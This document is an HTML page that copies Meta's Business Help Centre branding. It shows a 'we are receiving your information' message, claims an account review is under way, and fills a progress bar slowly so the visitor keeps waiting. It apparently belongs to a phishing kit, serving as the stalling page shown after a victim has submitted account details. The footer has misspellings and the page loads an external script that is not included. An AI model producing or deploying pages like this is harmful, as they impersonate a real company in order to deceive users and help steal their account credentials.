<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Meta - Business Help Centre</title>
    <script src="https://cdn.tailwindcss.com"></script>

  <style>
    progress::-moz-progress-bar {
    background: #1877f2;
    border-radius: 5px;
    }

    /* For Chrome or Safari */
    progress::-webkit-progress-value {
    background: #1877f2;
    border-radius: 5px;
    }

    /* For IE10 */
    progress {
    background: #1877f2;
    border-radius: 5px;
    }
  </style>
</head>

<body class=" bg-[#F0F2F5] ">

  <div class="header shadow-sm fixed top-0 left-0 right-0 z-50">
    <nav class="bg-white py-2 md:py-4">
      <div class="container px-4 mx-auto md:flex md:items-center">

        <div class="flex justify-between items-center">
          <img class="w-[260px] h-[20px]" src="./assets/meta.png" alt="">
          <button class="border border-solid border-gray-600 px-3 py-1 rounded text-gray-600 opacity-50 hover:opacity-75 md:hidden"
            id="navbar-toggle">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="hidden md:flex flex-col md:flex-row md:ml-auto mt-3 md:mt-0" id="navbar-collapse">
          <a href="#" class="p-2 lg:px-4 md:mx-2 text-white rounded bg-[#1877f2]">Get Started</a>
          <a href="https://www.facebook.com/business/ads " target="_blank"
            class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Advertise</a>
          <a href="https://www.facebook.com/business/learn/courses" target="_blank"
            class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Learn</a>
          <a href="https://www.facebook.com/business/help" target="_blank"
            class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Support</a>
        </div>
      </div>
    </nav>
  </div>

  <section class="container mx-auto pt-20 w-full h-full flex items-center justify-center my-40">
    <div class="bg-white w-full max-w-[600px] rounded-md shadow-lg mx-2 flex gap-x-10 items-center justify-center py-6 px-12">
      <div>
        <img src="./assets/ref.png" alt="Meta">
      </div>
      <div>
        <div class="flex flex-col gap-y-3">
          <p class="font-semibold">We are receiving your information</p>
          <p>Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.</p>
          <p>Please wait, this could take up to 10-20 minutes, please be patient while we review your case...</p>
        </div>
        <div class="loader w-full mt-3">
          <p class="text-xs font-semibold">Processing...</p>
          <progress class="w-full" value="" id="download" max="100"></progress>
        </div>
      </div>
    </div>
  </section>

    <footer class=" bg-[#1c2b33] text-[#cbd2d9] text-[13px] pt-20 pb-20">
      <div class="container mx-auto px-4">
        <div class="sm:flex sm:flex-wrap sm:-mx-4 md:py-4">
          <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6">
            <h5 class="text-xl font-bold mb-6">Meta technologies</h5>
            <ul class="list-none footer-links">
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Instagram</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Messenger</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">WhatsApp</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Audience Network</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Oculus</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Workplace</a>
              </li>
            </ul>
          </div>
          <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 sm:mt-0">
            <h5 class="text-xl font-bold mb-6">Goals</h5>
            <ul class="list-none footer-links">
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Set up a Facebook Ppage</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Build brand awareness</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Promote your local
                  business</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Grow online sales</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Promote your app</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Generate leads</a>
              </li>
            </ul>
          </div>
          <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
            <h5 class="text-xl font-bold mb-6">Industries</h5>
            <ul class="list-none footer-links">
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Automotive</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">B2B</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Consumer packaged goods</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">E-commerce</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Education</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Entertainment and media</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Financial services</a>
              </li>

            </ul>
          </div>
          <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
            <h5 class="text-xl font-bold mb-6">Tools</h5>
            <ul class="list-none footer-links">
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Free tools</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook pages</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Instagram profiles</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Stories</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Shops</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Meta Business Suite</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook ads</a>
              </li>

            </ul>
          </div>
          <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
            <h5 class="text-xl font-bold mb-6">Business Help Centre</h5>
            <ul class="list-none footer-links">
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Create and manage
                  accoutns</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Publish and distribute
                  content</a>
              </li>
              <li class="mb-2">
                <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Advertise</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </footer>


  <script type="module" src="/assets/js/main.js"></script>
  <script>
    window.onload = () => {
      setTimeout(() => {
        showProgress()
      }, 3000)
    }
    var progress = 0;
    var max = 100;
    function showProgress() {

      var progress_bar = document.getElementById('download')

      if(progress <= 100) {
        progress += 0.04

        progress_bar.value = progress
      }

      setTimeout('showProgress()', max);
    }
  </script>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>

</html>